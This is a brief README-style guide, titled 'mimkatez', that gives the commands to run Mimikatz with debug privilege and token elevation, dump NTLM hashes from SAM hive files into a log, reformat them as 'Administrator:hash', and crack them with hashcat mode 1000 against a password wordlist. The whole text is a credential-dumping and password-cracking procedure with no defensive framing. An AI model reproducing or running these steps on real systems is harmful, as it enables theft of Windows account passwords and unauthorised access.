# mimkatez

How to use it with hash cat 

first open mimikatez then write the  blow commands :

privilege::debug
token::elevate
log hash.txt
lsadump::sam filename1.hiv filename2.hiv

Now close mimikatez and open hash.txt and use notepad for findig NTLM and make new file as text , write like this :

Administrator:NTMLHASH

Last Part use this command :

hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 

Notice : you must have passwordlist like wordlist1.lst
